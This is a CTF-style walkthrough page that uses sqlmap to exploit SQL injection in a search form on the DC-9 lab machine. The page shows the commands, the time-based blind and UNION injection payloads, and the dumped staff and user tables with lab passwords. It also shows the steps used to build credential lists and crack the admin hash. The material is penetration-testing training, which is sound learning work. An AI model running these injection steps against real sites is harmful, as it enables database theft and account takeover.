---
layout: default
title: SQL Map
parent: SQL Injection
nav_order: 1
---

# SQL Map

---

## Database Dump

Simple web site called Example.com - Staff Details.

Poking around the web site does not yield much.

There is a _Search_ page we can try SQL injection with _sqlmap_.

![search](../../../../assets/images/ctfs/proving_grounds/dc-9/search.png)

Intercept in Burp and copy the entire GET Request and replace the _search_ payload with _FUZZME_.

![burp](../../../../assets/images/ctfs/proving_grounds/dc-9/burp.png)

Paste into a file named _req_

![req](../../../../assets/images/ctfs/proving_grounds/dc-9/req.png)

Run the _req_ file in _sqlmap_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ sqlmap -r req --dump --batch --dbms=mysql --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:21:42 /2023-11-09/
[19:22:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[19:22:09] [INFO] starting 3 processes
[19:22:19] [WARNING] no clear password(s) found
Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+

[19:22:19] [INFO] table 'Staff.Users' dumped to CSV file '/home/vagrant/.local/share/sqlmap/output/192.1
68.160.209/dump/Staff/Users.csv'
[19:22:19] [INFO] fetching columns for table 'StaffDetails' in database 'Staff'
[19:22:19] [INFO] fetching entries for table 'StaffDetails' in database 'Staff'
Database: Staff
Table: StaffDetails
[17 entries]
+----+-----------------------+----------------+------------+---------------------+-----------+----------
---------------------+
| id | email                 | phone          | lastname   | reg_date            | firstname | position
                     |
+----+-----------------------+----------------+------------+---------------------+-----------+----------
---------------------+
| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO
                     |
| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Res
ources               |
| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems A
dministrator         |
| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk
                     |
| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver
                     |
| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores
                     |
| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts
                     |
| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Ac
counts               |
| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President
 - Sales             |
| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor
                     |
| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal
Assistant            |
| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructo
r                    |
| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing
                     |
| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant
 Janitor             |
| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident
Cat                  |
| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replaceme
nt Janitor           |
| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant
 Replacement Janitor |
+----+-----------------------+----------------+------------+---------------------+-----------+----------
---------------------+
```

The above was the exfiltration from the _staff_ database.

Now we exfiltrate from the _users_ database by adding the _-D_ flag with the _users_ parameter.

```bash
──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ sqlmap -r req --dump --batch --dbms=mysql --dbs -D users
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It
is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume
 no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:32:52 /2023-11-09/

[19:32:52] [INFO] parsing HTTP request from 'req'
[19:32:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=FUZZME' AND (SELECT 7756 FROM (SELECT(SLEEP(5)))jGTb) AND 'NRma'='NRma

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=FUZZME' UNION ALL SELECT NULL,CONCAT(0x7171717171,0x4559644b454269584875796c53566c54
75426652586873526a57625242514e4c544d54624a754273,0x716b7a7171),NULL,NULL,NULL,NULL-- -
---
[19:32:52] [INFO] testing MySQL
[19:32:52] [INFO] confirming MySQL
[19:32:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)                                                   web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)                                                            [19:32:53] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users

[19:32:53] [INFO] fetching tables for database: 'users'
[19:32:53] [INFO] fetching columns for table 'UserDetails' in database 'users'
[19:32:53] [INFO] fetching entries for table 'UserDetails' in database 'users'
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

[19:32:54] [INFO] table 'users.UserDetails' dumped to CSV file '/home/vagrant/.local/share/sqlmap/output/192.168.160.209/dump/users/UserDetails.csv'
[19:32:54] [INFO] fetched data logged to text files under '/home/vagrant/.local/share/sqlmap/output/192.168.160.209'
[19:32:54] [WARNING] your sqlmap version is outdated

[*] ending @ 19:32:54 /2023-11-09/
```

Add the _users_ table output to a _creds_ file and cut the usernames and save to a _users_ file.

```bash

# Cut the username column from the creds table
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ cat creds | cut -d "|" -f6

```

Now cut the passwords from _creds_ and save to a _pass_ file.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ cat creds | cut -d "|" -f4

```

Crack the admin hash that was provided in the initial _sqlmap_ output and add the the top of the _pass_ file.

![crackstation](../../../../assets/images/ctfs/proving_grounds/dc-9/crackstation.png)

Now we can logon to the site as _admin_.
